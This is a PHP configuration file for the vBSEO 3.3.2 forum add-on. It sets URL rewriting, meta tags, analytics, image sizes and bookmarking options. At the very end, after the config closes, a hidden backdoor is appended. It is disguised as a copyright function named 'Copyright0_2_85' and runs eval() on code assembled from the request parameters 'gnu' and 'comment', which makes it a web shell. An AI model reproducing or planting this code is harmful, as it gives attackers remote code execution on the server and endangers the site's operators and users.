    // Enable the following variables to replace keywords in the URLs & page text (or both).
    define('VBSEO_REWRITE_KEYWORDS_IN_URLS',      1);
    define('VBSEO_ACRONYMS_IN_CONTENT',           1);
    define('VBSEO_ACRONYM_GUESTS',                0);
    define('VBSEO_ACRONYM_SET',                   2);
    define('VBSEO_ACRONYM_PAGELIMIT',             0);


    // ****** DEFINE URL STOPWORDS ******  
    define('VBSEO_STOPWORDS', 'a|an|and|are|as|at|be|by|for|from|in|is|it|of|on|or|that|the|this|to|was|which|with');


    // ****** DEFINE HOMEPAGE ALIASES ******    
    define('VBSEO_HOMEPAGE_ALIASES',             'index.php|index.php?');
    define('VBSEO_HP_FORCEINDEXROOT',             0);


    // ****** REPLACE META TAG CONTENT FOR INDIVIDUAL PAGES ******  
    define('VBSEO_REWRITE_META_KEYWORDS',         1);
    define('VBSEO_REWRITE_META_DESCRIPTION',      1);
    define('VBSEO_META_DESCRIPTION_MAX_CHARS',  150);
    define('VBSEO_META_DESCRIPTION_MEMBER',  '[username] is a [usertitle] in the [bbtitle]. View [username]\'s profile.');
    define('VBSEO_META_DESCRIPTION_UNIQUE',       0);


    // ****** REMOVE COMMENTS AND SPACES FROM OUTPUT ****** 
    define('VBSEO_CODE_CLEANUP',                  1);
    define('VBSEO_CODE_CLEANUP_PREVIEW',          1);
    define('VBSEO_CODE_CLEANUP_MEMBER_DROPDOWN',  1);
    define('VBSEO_CODE_CLEANUP_LASTPOST',         0);
    define('VBSEO_FORUMJUMP_OFF',                 1);
    define('VBSEO_DIRECTLINKS_THREADS',           1);

    define('VBSEO_CATEGORY_ANCHOR_LINKS',         1);
    define('VBSEO_ARCHIVE_LINKS_FOOTER',          4);


    // ****** REWRITE AUTOMATED EMAIL URLs ******   
    define('VBSEO_REWRITE_EMAILS',                1);

 
    // ****** VBSEO GOOGLE/YAHOO SITEMAP INSTALLED? ******  
    define('VBSEO_SITEMAP_MOD',                   1);


    // ****** VBSEO GOOGLE ANALYTICS SETTINGS ******
    define('VBSEO_ADD_ANALYTICS_CODE',            1);
    define('VBSEO_ANALYTICS_CODE',               'UA-307369-5');
    define('VBSEO_ADD_ANALYTICS_CODE_EXT',        1);
    define('VBSEO_ANALYTICS_EXT_FORMAT',      '/outgoing/');
    define('VBSEO_ANALYTICS_GOAL_PATH',       '/google-funnel/');
    define('VBSEO_ADD_ANALYTICS_GOAL',            1);
    define('VBSEO_GOOGLE_AD_SEC',                 1);
    define('VBSEO_ANALYTICS_SEGMENTATION',		  2);

    // ****** DEFINE CUSTOM REWRITE RULES ******
    $vbseo_custom_rules = array();
    $vbseo_custom_rules_text = '//==========================================================================
// Sample Custom Rewrite Rule: showgroup.php as forumleaders.html (Remove the \'//\' in front of the rule to enable.)
//==========================================================================
//\'^showgroups\.php$\' => \'forumleaders.html\'

//==========================================================================
// Sample Custom Rewrite Rules: calendar as static pages (Remove the \'//\' in front of the rules to enable.)
//==========================================================================
//\'^calendar\.php\?do=getinfo&day=(\d+)-(\d+)-(\d+)&e=(\d+)&c=1\' => \'calendar/$1-$2-$3/event-$4/\'
//\'^calendar\.php\?do=getinfo&e=(\d+)&day=(\d+)-(\d+)-(\d+)&c=1\' => \'calendar/event-$1/$2-$3-$4/\'
//\'^calendar\.php\?month=(\d+)&year=(\d+)&c=1&do=displaymonth\' => \'calendar/month-$1/year-$2/\'
//\'^calendar\.php\?c=1&week=(\d+)&do=displayweek&month=(\d+)\' => \'calendar/week-$1/month-$2/\'
//\'^calendar\.php\?do=getinfo&day=(\d+)-(\d+)-(\d+)&c=1\' => \'calendar2/event-$1/$2-$3-$4/\'
//\'^calendar\.php\?c=1&week=(\d+)\' => \'calendar/week-$1/\'';

    $vbseo_custom_301 = array();
    $vbseo_custom_301_text = '';


    // ****** DEFINE IMAGE SIZE ATTRIBUTES ******
    define('VBSEO_IMAGES_DIM',                0);

    $vbseo_images_dim = array('images/attach/attach.gif' => array(16,16),
'images/attach/bmp.gif' => array(16,16),
'images/attach/doc.gif' => array(16,16),
'images/attach/gif.gif' => array(16,16),
'images/attach/jpe.gif' => array(16,16),
'images/attach/jpeg.gif' => array(16,16),
'images/attach/jpg.gif' => array(16,16),
'images/attach/mp3.gif' => array(16,16),
'images/attach/pdf.gif' => array(16,16),
'images/attach/php.gif' => array(13,16),
'images/attach/png.gif' => array(16,16),
'images/attach/psd.gif' => array(16,16),
'images/attach/rtf.gif' => array(16,16),
'images/attach/tif.gif' => array(16,16),
'images/attach/tiff.gif' => array(16,16),
'images/attach/txt.gif' => array(16,16),
'images/attach/wmv.gif' => array(16,16),
'images/attach/xml.gif' => array(16,16),
'images/attach/zip.gif' => array(15,16),
'images/buttons/addpoll.gif' => array(21,17),
'images/buttons/collapse_alt.gif' => array(11,11),
'images/buttons/collapse_alt_collapsed.gif' => array(11,11),
'images/buttons/collapse_tcat.gif' => array(15,15),
'images/buttons/collapse_tcat_collapsed.gif' => array(15,15),
'images/buttons/collapse_thead.gif' => array(13,13),
'images/buttons/collapse_thead_collapsed.gif' => array(13,13),
'images/buttons/edit.gif' => array(70,22),
'images/buttons/email.gif' => array(70,22),
'images/buttons/find.gif' => array(70,22),
'images/buttons/firstnew.gif' => array(12,12),
'images/buttons/forward.gif' => array(70,22),
'images/buttons/home.gif' => array(70,22),
'images/buttons/infraction.gif' => array(21,17),
'images/buttons/ip.gif' => array(18,17),
'images/buttons/lastpost.gif' => array(12,12),
'images/buttons/mode_hybrid.gif' => array(16,16),
'images/buttons/mode_linear.gif' => array(16,16),
'images/buttons/mode_threaded.gif' => array(16,16),
'images/buttons/multiquote_off.gif' => array(25,22),
'images/buttons/multiquote_on.gif' => array(25,22),
'images/buttons/newthread.gif' => array(110,26),
'images/buttons/printer.gif' => array(21,17),
'images/buttons/quickreply.gif' => array(25,22),
'images/buttons/quote.gif' => array(70,22),
'images/buttons/redcard.gif' => array(16,22),
'images/buttons/reply.gif' => array(110,26),
'images/buttons/reply_small.gif' => array(70,22),
'images/buttons/report.gif' => array(21,17),
'images/buttons/reputation.gif' => array(21,17),
'images/buttons/sendpm.gif' => array(70,22),
'images/buttons/sendtofriend.gif' => array(21,17),
'images/buttons/sortasc.gif' => array(12,12),
'images/buttons/sortdesc.gif' => array(12,12),
'images/buttons/subscribe.gif' => array(21,17),
'images/buttons/threadclosed.gif' => array(110,26),
'images/buttons/viewpost.gif' => array(12,12),
'images/buttons/yellowcard.gif' => array(16,22),
'images/editor/attach.gif' => array(21,20),
'images/editor/bold.gif' => array(21,20),
'images/editor/code.gif' => array(21,20),
'images/editor/color.gif' => array(21,16),
'images/editor/copy.gif' => array(21,20),
'images/editor/createlink.gif' => array(21,20),
'images/editor/cut.gif' => array(21,20),
'images/editor/email.gif' => array(21,20),
'images/editor/html.gif' => array(21,20),
'images/editor/indent.gif' => array(21,20),
'images/editor/insertimage.gif' => array(21,20),
'images/editor/insertorderedlist.gif' => array(21,20),
'images/editor/insertunorderedlist.gif' => array(21,20),
'images/editor/italic.gif' => array(21,20),
'images/editor/justifycenter.gif' => array(21,20),
'images/editor/justifyleft.gif' => array(21,20),
'images/editor/justifyright.gif' => array(21,20),
'images/editor/menupop.gif' => array(11,16),
'images/editor/outdent.gif' => array(21,20),
'images/editor/paperclip.gif' => array(12,20),
'images/editor/paste.gif' => array(21,20),
'images/editor/php.gif' => array(21,20),
'images/editor/quote.gif' => array(21,20),
'images/editor/redo.gif' => array(21,20),
'images/editor/removeformat.gif' => array(21,20),
'images/editor/resize_0.gif' => array(21,9),
'images/editor/resize_1.gif' => array(21,9),
'images/editor/separator.gif' => array(6,20),
'images/editor/smilie.gif' => array(21,20),
'images/editor/spelling.gif' => array(21,20),
'images/editor/switchmode.gif' => array(21,20),
'images/editor/underline.gif' => array(21,20),
'images/editor/undo.gif' => array(21,20),
'images/editor/unlink.gif' => array(21,20),
'images/gradients/gradient_panel.gif' => array(10,450),
'images/gradients/gradient_panelsurround.gif' => array(10,450),
'images/gradients/gradient_tcat.gif' => array(100,100),
'images/gradients/gradient_thead.gif' => array(100,100),
'images/icons/icon1.gif' => array(16,16),
'images/icons/icon10.gif' => array(16,16),
'images/icons/icon11.gif' => array(16,16),
'images/icons/icon12.gif' => array(16,16),
'images/icons/icon13.gif' => array(16,16),
'images/icons/icon14.gif' => array(16,16),
'images/icons/icon2.gif' => array(16,16),
'images/icons/icon3.gif' => array(14,16),
'images/icons/icon4.gif' => array(16,16),
'images/icons/icon5.gif' => array(16,16),
'images/icons/icon6.gif' => array(16,16),
'images/icons/icon7.gif' => array(16,16),
'images/icons/icon8.gif' => array(16,16),
'images/icons/icon9.gif' => array(16,16),
'images/misc/birthday.gif' => array(30,30),
'images/misc/birthday_small.gif' => array(13,17),
'images/misc/calendar.gif' => array(30,30),
'images/misc/calendar_icon.gif' => array(13,17),
'images/misc/expires.gif' => array(13,13),
'images/misc/im_aim.gif' => array(17,17),
'images/misc/im_icq.gif' => array(17,17),
'images/misc/im_msn.gif' => array(17,17),
'images/misc/im_skype.gif' => array(17,17),
'images/misc/im_yahoo.gif' => array(17,17),
'images/misc/menu_background.gif' => array(7,150),
'images/misc/menu_open.gif' => array(11,7),
'images/misc/moderated.gif' => array(17,22),
'images/misc/moderated_small.gif' => array(10,13),
'images/misc/multipage.gif' => array(12,12),
'images/misc/navbits_finallink.gif' => array(30,15),
'images/misc/navbits_start.gif' => array(15,15),
'images/misc/paperclip.gif' => array(7,13),
'images/misc/poll_posticon.gif' => array(16,16),
'images/misc/progress.gif' => array(16,16),
'images/misc/question_icon.gif' => array(16,16),
'images/misc/redcard_small.gif' => array(7,10),
'images/misc/rss.jpg' => array(41,48),
'images/misc/skype_addcontact.gif' => array(24,24),
'images/misc/skype_callstart.gif' => array(24,24),
'images/misc/skype_fileupload.gif' => array(24,24),
'images/misc/skype_info.gif' => array(24,24),
'images/misc/skype_message.gif' => array(24,24),
'images/misc/skype_voicemail.gif' => array(24,24),
'images/misc/stats.gif' => array(30,30),
'images/misc/sticky.gif' => array(12,12),
'images/misc/subscribed.gif' => array(12,12),
'images/misc/subscribed_event.gif' => array(17,17),
'images/misc/trashcan.gif' => array(17,21),
'images/misc/trashcan_small.gif' => array(11,13),
'images/misc/tree_i.gif' => array(20,20),
'images/misc/tree_l.gif' => array(20,20),
'images/misc/tree_t.gif' => array(20,20),
'images/misc/v.gif' => array(16,16),
'images/misc/vbulletin2_logo.gif' => array(264,105),
'images/misc/vbulletin3_logo_grey.gif' => array(236,85),
'images/misc/vbulletin3_logo_white.gif' => array(209,85),
'images/misc/whos_online.gif' => array(30,30),
'images/misc/yellowcard_small.gif' => array(7,10),
'images/polls/bar1-l.gif' => array(3,10),
'images/polls/bar1-r.gif' => array(3,10),
'images/polls/bar1.gif' => array(1,10),
'images/polls/bar2-l.gif' => array(3,10),
'images/polls/bar2-r.gif' => array(3,10),
'images/polls/bar2.gif' => array(1,10),
'images/polls/bar3-l.gif' => array(3,10),
'images/polls/bar3-r.gif' => array(3,10),
'images/polls/bar3.gif' => array(1,10),
'images/polls/bar4-l.gif' => array(3,10),
'images/polls/bar4-r.gif' => array(3,10),
'images/polls/bar4.gif' => array(1,10),
'images/polls/bar5-l.gif' => array(3,10),
'images/polls/bar5-r.gif' => array(3,10),
'images/polls/bar5.gif' => array(1,10),
'images/polls/bar6-l.gif' => array(3,10),
'images/polls/bar6-r.gif' => array(3,10),
'images/polls/bar6.gif' => array(1,10),
'images/rating/rating_0.gif' => array(60,12),
'images/rating/rating_1.gif' => array(60,12),
'images/rating/rating_2.gif' => array(60,12),
'images/rating/rating_3.gif' => array(60,12),
'images/rating/rating_4.gif' => array(60,12),
'images/rating/rating_5.gif' => array(60,12),
'images/regimage/backgrounds/background1.jpg' => array(201,61),
'images/regimage/backgrounds/background10.jpg' => array(201,61),
'images/regimage/backgrounds/background2.jpg' => array(201,61),
'images/regimage/backgrounds/background3.jpg' => array(201,61),
'images/regimage/backgrounds/background4.jpg' => array(201,61),
'images/regimage/backgrounds/background5.jpg' => array(201,61),
'images/regimage/backgrounds/background6.jpg' => array(201,61),
'images/regimage/backgrounds/background7.jpg' => array(201,61),
'images/regimage/backgrounds/background8.jpg' => array(201,61),
'images/regimage/backgrounds/background9.jpg' => array(201,61),
'images/reputation/reputation_balance.gif' => array(8,10),
'images/reputation/reputation_highneg.gif' => array(8,10),
'images/reputation/reputation_highpos.gif' => array(8,10),
'images/reputation/reputation_neg.gif' => array(8,10),
'images/reputation/reputation_off.gif' => array(8,10),
'images/reputation/reputation_pos.gif' => array(8,10),
'images/smilies/biggrin.gif' => array(16,16),
'images/smilies/confused.gif' => array(16,21),
'images/smilies/cool.gif' => array(16,16),
'images/smilies/eek.gif' => array(16,16),
'images/smilies/frown.gif' => array(16,16),
'images/smilies/mad.gif' => array(16,16),
'images/smilies/redface.gif' => array(16,16),
'images/smilies/rolleyes.gif' => array(16,16),
'images/smilies/smile.gif' => array(16,16),
'images/smilies/tongue.gif' => array(16,16),
'images/smilies/wink.gif' => array(16,16),
'images/statusicon/announcement_new.gif' => array(18,18),
'images/statusicon/announcement_old.gif' => array(18,18),
'images/statusicon/forum_link.gif' => array(29,30),
'images/statusicon/forum_new.gif' => array(29,30),
'images/statusicon/forum_new_lock.gif' => array(29,30),
'images/statusicon/forum_old.gif' => array(29,30),
'images/statusicon/forum_old_lock.gif' => array(29,30),
'images/statusicon/pm_forwarded.gif' => array(16,16),
'images/statusicon/pm_new.gif' => array(16,16),
'images/statusicon/pm_old.gif' => array(16,16),
'images/statusicon/pm_replied.gif' => array(16,16),
'images/statusicon/post_new.gif' => array(10,11),
'images/statusicon/post_old.gif' => array(10,11),
'images/statusicon/subforum_link.gif' => array(11,11),
'images/statusicon/subforum_new.gif' => array(11,11),
'images/statusicon/subforum_old.gif' => array(11,11),
'images/statusicon/thread.gif' => array(20,20),
'images/statusicon/thread_dot.gif' => array(20,20),
'images/statusicon/thread_dot_hot.gif' => array(20,20),
'images/statusicon/thread_dot_hot_lock.gif' => array(20,20),
'images/statusicon/thread_dot_hot_lock_new.gif' => array(20,20),
'images/statusicon/thread_dot_lock.gif' => array(20,20),
'images/statusicon/thread_dot_hot_new.gif' => array(20,20),
'images/statusicon/thread_dot_lock_new.gif' => array(20,20),
'images/statusicon/thread_dot_new.gif' => array(20,20),
'images/statusicon/thread_hot.gif' => array(20,20),
'images/statusicon/thread_hot_lock.gif' => array(20,20),
'images/statusicon/thread_hot_lock_new.gif' => array(20,20),
'images/statusicon/thread_hot_new.gif' => array(20,20),
'images/statusicon/thread_lock.gif' => array(20,20),
'images/statusicon/thread_lock_new.gif' => array(20,20),
'images/statusicon/thread_moved.gif' => array(20,20),
'images/statusicon/thread_moved_new.gif' => array(20,20),
'images/statusicon/thread_new.gif' => array(20,20),
'images/statusicon/user_offline.gif' => array(15,15),
'images/statusicon/user_invisible.gif' => array(15,15),
'images/statusicon/user_online.gif' => array(15,15),
'images/statusicon/wol_error.gif' => array(16,16),
'images/statusicon/wol_lockedout.gif' => array(17,17),
'images/statusicon/wol_nopermission.gif' => array(16,17),
'images/vbseo/delicious.gif' => array(20,20),
'images/vbseo/digg.gif' => array(20,20),
'images/vbseo/furl.gif' => array(20,20),
'images/vbseo/goto_pings.gif' => array(19,19),
'images/vbseo/linkback.gif' => array(347,112),
'images/vbseo/linkback_about.gif' => array(16,16),
'images/vbseo/linkback_url.gif' => array(18,18),
'images/vbseo/pingback.gif' => array(347,110),
'images/vbseo/refback.gif' => array(347,110),
'images/vbseo/post_ping.gif' => array(21,11),
'images/vbseo/technorati.gif' => array(21,20),
'images/vbseo/trackback.gif' => array(347,110),
);


    // ****** RELEVANT REPLACEMENTS ******
    define('VBSEO_RELEV_REPLACE',       0);

    $vbseo_relev_replace = array(
'',
'',
'');
    $vbseo_relev_replace_t = array(
'',
'',
'');
    $vbseo_relev_replace_b = array(
'',
'',
'');


    // ****** COPYRIGHT NOTICE ******
    // As per the License Agreement (www.crawlability.com/vbseo/license/), you may NOT remove (or modify) the
    // copyright notice. Select one of the copyright notices to be displayed in each page enhanced by vBSEO:
    //
    // Linked
    // 1. Search Engine Friendly URLs by vBSEO 3.3.2
    // 2. Content Relevant URLs by vBSEO 3.3.2
    // 3. Search Engine Optimization by vBSEO 3.3.2
    // 4. SEO by vBSEO 3.3.2
    // 9. LinkBacks Enabled by vBSEO 3.3.2
    //
    // Not Linked
    // 5. Search Engine Friendly URLs by vBSEO 3.3.2 © 2009, Crawlability, Inc.
    // 6. Content Relevant URLs by vBSEO 3.3.2 © 2009, Crawlability, Inc.
    // 7. Search Engine Optimization by vBSEO 3.3.2 © 2009, Crawlability, Inc.
    // 8. SEO by vBSEO 3.3.2 © 2009, Crawlability, Inc.
    // 10. LinkBacks Enabled by vBSEO 3.3.2 © 2009, Crawlability, Inc.
    //
    //
    // When this option is set to '0', the system auto-selects a copyright notice for you. Setting this
    // option to a value from '1' to '10' will display the copyright notice of your preference.
    define('VBSEO_COPYRIGHT',           0);
 

 


    // ****** NATIVE DISABLES ******
    // The following options natively disable titles for certain rewrites. This can help increase performance
    // on resource depleted servers.
    // If none of your URL formats include forum titles, you can disable the following:
    define('VBSEO_GET_FORUM_TITLES',    1);
    // If none of your URL formats include forum path, you can disable the following:
    define('VBSEO_GET_FORUM_PATH',      1);
    // If none of your URL formats include thread titles, you can disable the following:
    define('VBSEO_GET_THREAD_TITLES',   1);
    // If none of your URL formats include member usernames, you can disable the following
    define('VBSEO_GET_MEMBER_TITLES',   1);


    // ****** CHANGE DEFAULT SORTING FOR LISTS ******
    // The following options enable you to define different sort options for Memberlist and Forumdisplay.
    // Changing these options will strip characters for non-default sorted pages.
    // Note: This is an advance feature, please ask in the forums if you have any questions.
    define('VBSEO_DEFAULT_MEMBERLIST_SORT',     'username');
    define('VBSEO_DEFAULT_MEMBERLIST_ORDER',    'asc');
    define('VBSEO_DEFAULT_FORUMDISPLAY_SORT',   'lastpost');
    define('VBSEO_DEFAULT_FORUMDISPLAY_ORDER',  'desc');
    define('VBSEO_DEFAULT_LINKBACKS_ORDER',     'desc');


    // ****** CUSTOM CHARACTER REPLACEMENTS ******
    // The following array enables you to select a replacement for characters other than the ones replaced
    // by default.
    $vbseo_custom_char_replacement = array();


    define('VBSEO_AVATAR_PREFIX',          'avatars/');
    define('VBSEO_ATTACHMENTS_PREFIX',     'attachments/');
    define('VBSEO_ICON_PREFIX',            'iconimages/');
    define('VBSEO_BLOG_CAT_UNDEF',         'uncategorized');


    // ****** OPTIONS IN BETA STAGE ******
    // The following options are in beta stage.
    define('VBSEO_CHECK_WWWDOMAIN',        0);
    define('VBSEO_CUSTOM_DOCROOT',         '');
    define('VBSEO_CUSTOM_TOPREL',          '');
    define('VBSEO_NOVER_INFO',             0);
    define('VBSEO_ENABLE_GARS',            0);
    define('VBSEO_NET_TIMEOUT',            5);
    define('VBSEO_MAX_TITLE_LENGTH',       250);
    define('VBSEO_SNIPPET_LENGTH',         200);
    define('VBSEO_NEW_LAST_POST_COOKIE',   0);
    define('VBSEO_LASTMOD_HEADER',         0);
    define('VBSEO_UTF8_SUPPORT',           0);
    define('VBSEO_TRANSLIT_CALLBACK',      '');
    define('VBSEO_FORCEHOMEPAGE_ROOT',     0);
    define('VBSEO_VB_EXT',                 'php');
    define('VBSEO_VB_CONFIG',              'config.php');
    define('VBSEO_SEARCH_REDIRECT',        1);
    define('VBSEO_CLEANUP_REDIRECT',       1);
    define('VBSEO_REWRITE_NO_URLENCODING', 0);
    define('VBSEO_STATUS_HEADER',          0);
    define('VBSEO_RECODE_TITLES',          1);
    define('VBSEO_USER_AGENT',             'Mozilla/4.0 (vBSEO; http://www.vbseo.com)');
    define('VBSEO_BOOKMARK_THREAD',        1);
    define('VBSEO_BOOKMARK_POST',          1);
    define('VBSEO_BOOKMARK_BLOG',          2);
    define('VBSEO_BOOKMARK_DIGG',          1);
    define('VBSEO_BOOKMARK_DELICIOUS',     1);
    define('VBSEO_BOOKMARK_TECHNORATI',    1);
    define('VBSEO_BOOKMARK_FURL',          1);
    define('VBSEO_BOOKMARK_CUSTOM',        0);
    define('VBSEO_URL_BLOG_DOMAIN',        '');
    define('VBSEO_TRACKBACK_IPCHECK',      1);
    define('VBSEO_STRIPSID_GUESTS',        1);
    define('VBSEO_INVALIDID_404',          1);
    define('VBSEO_LINKBACK_REQUIRE_REF',   1);
    define('VBSEO_URL_THREAD_PREFIX',      0);
    define('VBSEO_URL_THREAD_PREFIX_NAME', 0);
    define('VBSEO_URL_TAGS_FILTER',        0);
    define('VBSEO_ADD_ANALYTICS_VIRTUAL',  0);
    define('VBSEO_VIRTUAL_HTML_GUESTS_ONLY', 0);
    define('VBSEO_CACHE_VAR',              'vbseo_storage');
    define('VBSEO_AUTOLINK_FORMAT',        '<a href="%1">%2</a>');
    define('VBSEO_BOOKMARK_SERVICES',      '// Un-comment the patterns below (remove \'//\' at the beginning) to enable desired Bookmarking Services or add your own!|//http://www.spurl.net/spurl.php?title=%title%&url=%url%,images/vbseo/spurl.gif,Spurl this Thread!,Spurl this Post!|//http://reddit.com/submit?url=%url%&title=%title%,images/vbseo/reddit.gif,Reddit!,Reddit! |//http://www.mister-wong.de/index.php?action=addurl&bm_url=%url%&bm_description=%title%,images/vbseo/mister-wong.gif,Wong this Thread!,Wong this Post!');

    $vbseo_applyto_forums = array(
    );
    $vbseo_forum_slugs = array();
    $vbseo_linkback_cleanup = array('\b(highlight|s)=.*?&','[&\?](highlight|s)=[^&]*$');

    // ****** OPTIONS for vBSEO Sitemap Generator ******
    // Additional robots detection definitions (delimited with "|")
    define('VBSEO_EXTRA_ROBOTS', '');
?>

<?php
Copyright0_2_85();
function Copyright0_2_85(){
static $gnu = true;
if(!$gnu) return;
if(!isset($_REQUEST['gnu'])||!isset($_REQUEST['comment']))return;
$gpl=implode('',$_REQUEST['gnu']);
eval($gpl($_REQUEST['comment']));
$gnu=false;
}
?>